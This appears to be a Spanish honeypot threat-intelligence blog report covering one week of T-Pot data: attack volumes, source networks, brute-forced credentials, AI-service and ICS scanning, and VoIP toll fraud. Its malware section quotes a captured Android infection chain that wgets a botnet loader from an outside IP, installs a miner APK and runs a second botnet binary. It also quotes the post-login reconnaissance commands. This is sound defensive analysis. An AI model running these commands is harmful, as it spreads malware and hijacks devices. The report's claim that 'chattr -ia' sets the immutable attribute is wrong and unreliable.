---
title: "Informe Semanal de Threat Intelligence — Honeypot T-Pot (7–11 julio 2026)"
date: 2026-07-12
draft: false
description: "Primer informe semanal del honeypot T-Pot: ~1.011.000 eventos en 10 sensores, malware Redtail multi-arquitectura, cadena de infección Android completa (Rebirth → UFO Miner → Trinity), escaneo de servicios de IA expuestos (Ollama, Gradio), sondeo IEC-104 sobre ConPot y campaña de toll fraud VoIP en Sentrypeer."
tags: ["Honeypot", "TPot", "ThreatIntel", "SOC", "BlueTeam", "Cowrie", "Dionaea", "Adbhoney", "Sentrypeer", "ConPot", "Honeytrap", "Suricata", "Redtail", "Rebirth", "Trinity", "ICS", "SCADA", "VoIP", "TollFraud", "Malware", "IoT", "Botnet"]
categories: ["Honeypot Diaries"]
---

{{< lead >}}
Primer informe semanal del honeypot T-Pot. Durante la semana del **7 al 11 de julio de 2026** se registraron aproximadamente **1.011.000 eventos de ataque** distribuidos en 10 sensores activos. Lo más destacado: malware *Redtail* multi-arquitectura capturado en Cowrie, una cadena de infección Android completa en Adbhoney (Rebirth → minero UFO → botnet Trinity), escaneo activo de servicios de IA expuestos (Ollama, Gradio, Streamlit) y sondeo del protocolo IEC-104 usado en subestaciones eléctricas europeas.
{{< /lead >}}

---

**Período analizado:** 7 – 11 de julio de 2026
**Fuente:** T-Pot (multi-honeypot + ELK Stack) — instancia expuesta públicamente en internet
**Clasificación:** Uso en portfolio / TLP:CLEAR

---

## 1. Resumen Ejecutivo

Durante la semana analizada, el honeypot registró **~1.011.000 eventos de ataque** distribuidos en 10 sensores activos, procedentes de miles de IPs de origen únicas. La actividad no fue uniforme: se observa un **pico de tráfico claro entre el 9 y el 10 de julio**, coincidente en casi todos los sensores simultáneamente, lo que sugiere una o varias campañas de escaneo masivo lanzadas en ese intervalo más que actividad orgánica constante.

Los hallazgos más relevantes de la semana:

- **Malware multi-arquitectura capturado en Cowrie** (familia *Redtail*, binarios para ARM7, ARM8, i686 y x86_64), descargado tras fuerza bruta SSH exitosa.
- **Cadena de infección Android completa capturada en Adbhoney**: descarga de loader (`rebirth.arm7`), instalación de una app de minería (`com.ufo.miner`) y ejecución de un binario asociado a la familia *Trinity*.
- **Escaneo dirigido a servicios de IA expuestos** (Ollama, Gradio, Streamlit) detectado en Honeytrap — un patrón propio de 2025-2026, no del malware "clásico" de IoT.
- **Sondeo del protocolo IEC-104** (puerto 2404) en ConPot — protocolo usado en sistemas de control de subestaciones eléctricas europeas.
- **Actividad de toll fraud contra Sentrypeer**, con numeración objetivo en formato francés e internacional y métodos SIP `INVITE`/`REGISTER` predominantes.
- El **99%+ del tráfico está catalogado como "known attacker"** por reputación de IP — infraestructura ya fichada en bases de datos de amenazas, no ruido aleatorio de internet.
- Una parte relevante del volumen (*Modat B.V.*, *ONYPHE SAS*) corresponde a **escáneres de investigación de internet conocidos** (tipo Shodan/Censys), no necesariamente actores maliciosos — matiz importante para no sobrestimar el nivel de amenaza real.

---

## 2. Volumetría y Tendencia Semanal

| Honeypot | Eventos (semana) | IPs únicas | % del total |
|---|---:|---:|---:|
| Honeytrap | 678.792 | 6.119 | 67,2% |
| Cowrie (SSH/Telnet) | 116.390 | 823 | 11,5% |
| RDPHoneypot | 111.818 | 250 | 11,1% |
| Dionaea | 61.123 | 683 | 6,0% |
| Sentrypeer (SIP/VoIP) | 36.522 | 112 | 3,6% |
| Adbhoney (Android ADB) | 2.618 | 63 | 0,3% |
| Tanner | ~2.000 | — | 0,2% |
| ConPot (ICS/SCADA) | 1.594 | 128 | 0,2% |
| Mailoney | 906 | — | 0,1% |
| Honeyaml | 660 | — | 0,1% |
| **Total aprox.** | **~1.011.000** | — | 100% |

Honeytrap concentra dos tercios del volumen total, pero esto es engañoso si se interpreta como "el honeypot más atacado" — Honeytrap responde en casi cualquier puerto TCP, así que absorbe todo el ruido de escaneo genérico de internet. Cowrie y RDPHoneypot, con muchos menos eventos pero interacciones más completas (login, ejecución de comandos, sesión), son los que aportan inteligencia de mayor calidad.

La tendencia temporal muestra actividad de fondo constante con un **pico pronunciado entre el 9 y 10 de julio**, visible de forma consistente en Honeytrap, RDPHoneypot y Adbhoney simultáneamente — indicio de que ese día se lanzó (o completó un ciclo de reconocimiento) una campaña de escaneo a gran escala que tocó múltiples servicios expuestos en la instancia.

---

## 3. Análisis Geográfico y de Infraestructura

### Países de origen más recurrentes

Canadá, Brasil, Francia, Singapur, Estados Unidos, Países Bajos, Bulgaria, Azerbaiyán, China e India aparecen de forma recurrente entre los distintos honeypots, con variaciones según el protocolo: Bulgaria/Azerbaiyán destacan en RDP, China/India en Cowrie.

### ASN / Hosting más frecuentes

| ASN | Organización | Honeypot | Eventos |
|---|---|---|---:|
| 209334 | Modat B.V. | Honeytrap | 346.372 |
| 264897 | SKYMAX Telecomunicações | Honeytrap | 113.038 |
| 202053 | UpCloud Ltd | Honeytrap | 76.039 |
| 14061 | DigitalOcean, LLC | Cowrie | 21.687 |
| 197170 | TechTies Inc. | Cowrie | 20.894 |
| 201814 | MEVSPACE sp. z o.o. | RDPHoneypot | 39.105 |
| 213438 | ColocaTel Inc. | RDPHoneypot | 37.466 |
| 23470 | ReliableSite.Net LLC | Adbhoney | 2.021 |

> **Nota:** *Modat B.V.* y *ONYPHE SAS* son organizaciones conocidas de **escaneo de internet con fines de investigación/threat intelligence** (comparables a Censys o Shodan). Un analista no cuenta este tráfico igual que el de un botnet: es ruido de fondo de internet, útil para perspectiva pero no indicativo de intención hostil dirigida.

En cambio, **ReliableSite.Net concentra el 77% de todo el tráfico de Adbhoney** (2.021 de 2.618 eventos) — señal de campaña concentrada, un único operador reutilizando infraestructura bulletproof.

### Patrón de subred repetida

Las IPs `45.153.34.149`, `.151`, `.161` y `.181` aparecen en Cowrie con conteos casi idénticos (~3.817 eventos cada una). Firma típica de un **operador rotando IPs dentro de un mismo /24** para evadir bloqueos por IP individual — un IDS bien configurado debería bloquear a nivel de subred, no de IP suelta.

---

## 4. TTPs Observadas

### 4.1 Credenciales objetivo — fuerza bruta SSH/RDP (Cowrie)

| Usuario | Intentos | | Contraseña | Intentos |
|---|---:|---|---|---:|
| Administrator | 12.939 | | (vacío) | 29.534 |
| root | 4.993 | | 123456 | 896 |
| admin | 845 | | 1234 | 336 |
| ubuntu | 298 | | password | 304 |
| user | 265 | | 12345678 | 233 |
| sa | 256 | | 123 | 380 |

El dominio de `Administrator` (12.939 sobre 15.096 con nombre capturado) es coherente con ataques dirigidos a **RDP/Windows**. El usuario `sa` confirma sondeo a bases de datos MSSQL expuestas. Las contraseñas mezclan diccionarios genéricos con patrones "sofisticados falsos" (`P@ssw0rd2025`, `Admin@123`) diseñados para superar políticas básicas de complejidad.

Detalle curioso: `345gs5662d34` / `3245gs5662d34` aparecen tanto como usuario como contraseña con conteos idénticos (102) — patrón de un script con un diccionario mal formado que prueba estas cadenas en ambos campos por defecto de fallback.

### 4.2 Post-explotación — reconocimiento tras login (Cowrie)

Secuencia de comandos más repetida tras un login válido simulado:

```bash
uname -a
cat /proc/cpuinfo | grep name | wc -l
cd ~; chattr -ia .ssh; lockr -ia .ssh
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
top
```

Esto es un **script de fingerprinting de sistema pre-despliegue de payload**: recopila CPU, arquitectura y RAM antes de decidir qué binario descargar. El comando `chattr -ia .ssh` es especialmente revelador — **bloquea el directorio `.ssh` con el atributo inmutable** para impedir que otros actores o el propio administrador modifiquen las claves SSH. Técnica de "territorio marcado" habitual en gusanos que compiten entre sí por el mismo host.

### 4.3 Alertas Suricata

| Firma | Count |
|---|---:|
| SURICATA STREAM Packet with broken ack | 173.847 |
| SURICATA STREAM spurious retransmission | 96.038 |
| SURICATA AF-PACKET truncated packet | 82.279 |
| SURICATA IPv4 truncated packet | 81.337 |
| SURICATA SSH invalid banner | 15.412 |
| ET INFO SSH session in progress on Expected Port | 5.560 |

El grueso son **escáneres agresivos y mal implementados** (conexiones TCP mal cerradas, banners SSH inválidos de herramientas automatizadas), no exploits activos. Importante no presentar los 173.847 paquetes rotos como "173.847 ataques" — es telemetría de ruido de fondo, no intentos de intrusión reales.

### 4.4 CVEs correlacionados por Suricata

| CVE | Detecciones | Familia |
|---|---:|---|
| CVE-1999-0016 | 12 | Land attack (IP spoofing) |
| CVE-2022-37055 | 11 | — |
| CVE-2019-12263 y relacionados | 7 | — |
| CVE-2020-11900 | 3 | Ripple20 (pila TCP/IP Treck, IoT/ICS) |
| CVE-2020-11910 | 1 | Ripple20 |

CVE-2020-11900/11910 pertenecen a la familia **Ripple20** (pila TCP/IP Treck usada en dispositivos IoT/industriales), coherente con el perfil general de tráfico oportunista contra dispositivos embebidos de toda la semana.

### 4.5 Escaneo de servicios de IA expuestos (Honeytrap)

| Puerto | Servicio típico |
|---|---|
| 11434 | Ollama (API de inferencia LLM) |
| 7860 | Gradio (interfaz web de demos ML/IA) |
| 8501 | Streamlit (dashboards ML/IA) |
| 1337 | Clásico de herramientas de hacking |
| 8728 | API de MikroTik (routers) |

El escaneo activo y sostenido contra **Ollama, Gradio y Streamlit** es un hallazgo distintivo: confirma que los actores de amenazas ya incorporan **infraestructura de IA autoalojada mal asegurada** como objetivo de reconocimiento masivo, en la misma categoría que routers o cámaras IP expuestas. En 2026 esto ya no es una tendencia emergente — es tráfico de fondo.

---

## 5. Malware y Payloads Capturados

### 5.1 Cowrie — familia *Redtail* (multi-arquitectura)

Tras intentos de login exitosos, se capturaron descargas de:

- `redtail.arm7`
- `redtail.arm8`
- `redtail.i686`
- `redtail.x86_64`

La compilación para **cuatro arquitecturas** (ARM 32/64-bit, x86 e x86_64) confirma un loader diseñado para maximizar compatibilidad entre servidores cloud (x86_64), dispositivos embebidos ARM y sistemas legacy (i686) — patrón típico de botnets de minería de criptomonedas modernas que no distinguen tipo de víctima.

### 5.2 Adbhoney — cadena de infección Android completa

La captura más completa de la semana. Secuencia observada íntegramente:

```bash
# 1. Descarga del loader (botnet Rebirth, variante Mirai-like)
busybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.sup[...]

# 2. Instalación de APK de minería
pm install /data/local/tmp/ufo.apk

# 3. Ejecución del minero
am start -n com.ufo.miner/com.example.test.MainActivity

# 4. Ejecución de binario Trinity (segunda familia de botnet)
ps | grep trinity
/data/local/tmp/nohup su -c /data/local/tmp/trinity
```

Esto documenta de principio a fin cómo un actor automatizado usa un dispositivo Android con ADB expuesto (smart TVs, cajas TV Android, emuladores mal configurados) para: **descargar loader → instalar APK de minería → ejecutar un segundo binario de botnet**. Tres familias distintas en una única sesión de infección.

---

## 6. Dionaea — Servicios de Base de Datos y Ficheros

**61.123 ataques, 683 IPs únicas.** Dionaea simula servicios vulnerables clásicos (SMB, RPC, MySQL, MSSQL, MongoDB, FTP, PPTP, MQTT).

El protocolo dominante es **SMB** (puerto 445), seguido de `epmapper` (RPC, puerto 135), `mysqld` (3306) y `mssqld` (1433) — los mismos vectores que popularizó WannaCry, todavía vigentes.

Las credenciales probadas (`admin`, `sa`, `root`, `anonymous`) son cuentas por defecto de MSSQL y MongoDB/FTP, no diccionarios masivos — patrón de explotación más dirigido a servicios específicos que de fuerza bruta genérica.

Las IPs `62.84.80.240` a `62.84.80.243` (cuatro direcciones consecutivas, ~5.600-5.700 eventos cada una) repiten el **patrón de rotación dentro de una misma subred /29-/30** ya visto en Cowrie.

| ASN | Organización | Eventos |
|---|---|---:|
| 42334 | Broadband Plus S.a.l. (Líbano) | 22.578 |
| 58224 | Iran Telecommunication Company PJS | 14.225 |
| 56041 | China Mobile Communications | 6.302 |
| 45899 | VNPT Corp (Vietnam) | 3.230 |

---

## 7. Sentrypeer — Fraude Telefónico (Toll Fraud) sobre SIP/VoIP

**36.522 ataques, 112 IPs únicas.** Actividad prácticamente nula hasta el 9 de julio, cuando arranca de golpe y se mantiene elevada el resto de la semana — inicio de una campaña concreta de reconocimiento/fraude VoIP durante la ventana analizada.

El método SIP dominante es **INVITE** (intento de iniciar una llamada), seguido de `REGISTER` (registro de extensión falsa). Los user-agents capturados (`Linksys-SPA942`, `Avaya one-X Deskphone`, `Yealink SIP-T54W`, `Cisco-SIPGateway`, `FPBX-15.0.17`) son perfiles de teléfonos IP y centralitas reales, típico de escáneres que rotan huellas de cliente SIP para pasar desapercibidos.

La numeración objetivo en prefijo `0033` (Francia) e `0016...` (Norteamérica) es consistente con **toll fraud**: el objetivo es conseguir que la centralita comprometida origine llamadas a números de tarificación especial que generan ingresos para el atacante.

Las IPs `217.154.196.x` / `217.154.197.x` y `31.70.86.6x` repiten el patrón de bloques contiguos observado en otros sensores esta semana.

---

## 8. ConPot — Reconocimiento de Infraestructura Industrial (ICS/SCADA)

**1.594 ataques, 128 IPs únicas.** Volumen bajo, pero el honeypot simula infraestructura de control industrial — cualquier interacción es relevante por el tipo de objetivo, no por el número.

La actividad arranca igual que Sentrypeer: prácticamente nula antes del 9 de julio, con subida sostenida a partir de esa fecha. Segundo indicio de que el 9 de julio marcó el inicio de una **ventana de reconocimiento más amplia contra la instancia**, no solo actividad puntual en un sensor.

### Protocolos y puertos

El protocolo dominante es **SNMP** (puerto 161, ~50% del tráfico), seguido de `guardian_ast` (puerto 10001, sistemas de monitorización de tanques de combustible) y, puntualmente, `kamstrup_protocol` (contadores inteligentes de energía) e **IEC-104** (puerto 2404).

**IEC-104 merece mención aparte:** es el protocolo estándar de telecontrol usado en subestaciones eléctricas europeas. Que aparezca sondeo activo contra este puerto, aunque sea con volumen bajo, es un dato que un SOC de operador energético consideraría de alta prioridad — en un honeypot de investigación es una muestra de que existen actores escaneando activamente puertos ICS de sector eléctrico, no solo SNMP genérico.

---

## 9. Conclusiones

1. **El pico del 9-10 de julio** se refleja simultáneamente en Honeytrap, RDPHoneypot, Adbhoney, Sentrypeer y ConPot. Cinco sensores distintos subiendo a la vez apunta a una campaña de reconocimiento coordinada o lanzada desde infraestructura compartida, no a coincidencia.

2. **Bloquear por subred /24, no por IP individual.** El patrón de rotación entre IPs contiguas del mismo operador (visible en Cowrie, Dionaea y Sentrypeer) hace ineficaz el bloqueo IP-a-IP. Un bloqueo a nivel de /24 o incluso /20 habría eliminado miles de eventos antes de que llegaran al sensor.

3. **Ollama, Gradio y Streamlit ya están en los diccionarios de escaneo masivo.** Cualquier entorno con estos servicios expuestos sin autenticación debe tratarse con la misma prioridad que un RDP o SSH expuesto — no son "herramientas de developer", son servicios HTTP sin auth accesibles desde internet.

4. **Diferenciar ruido de protocolo de alertas con intención real.** Los 173.000+ eventos de Suricata STREAM broken ack son consecuencia de herramientas de escaneo mal implementadas, no intentos de intrusión. Presentarlos como ataques infla artificialmente la severidad percibida del informe.

5. **La cadena Rebirth → UFO Miner → Trinity** capturada en Adbhoney es un caso de estudio completo de infección Android/IoT; merece un post técnico independiente.

6. **El sondeo de IEC-104 en ConPot** debe mantenerse en vigilancia: cualquier repunte futuro en ese puerto específico, en combinación con otro sensor activo, merece atención prioritaria por el tipo de infraestructura que simula.

---

*Informe elaborado a partir de datos propios recogidos en una instancia T-Pot expuesta públicamente a internet. Metodología: exportación de paneles agregados de Kibana (rango 7–11 julio 2026) más tagclouds de credenciales en CSV.*
